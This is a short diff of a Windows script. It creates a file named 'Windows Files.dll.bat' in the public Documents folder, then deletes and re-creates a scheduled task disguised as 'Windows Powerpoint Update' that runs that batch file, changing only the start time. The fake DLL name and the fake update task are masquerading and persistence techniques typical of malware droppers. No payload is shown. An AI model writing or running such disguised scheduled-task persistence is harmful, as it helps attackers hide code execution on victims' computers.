@@ -9,5 +9,5 @@ powershell.exe New-Item -Path 'C:\Users\Public\Documents\Windows Files.dll.bat' 
 
 SCHTASKS /Delete /TN "Windows Powerpoint Update" /f
 
-SCHTASKS /Create /TN "Windows Powerpoint Update" /ST 14:56:00 /SC ONCE /TR "C:\Users\Public\Documents\Windows Files.dll.bat"
+SCHTASKS /Create /TN "Windows Powerpoint Update" /ST 15:30:00 /SC ONCE /TR "C:\Users\Public\Documents\Windows Files.dll.bat"
 
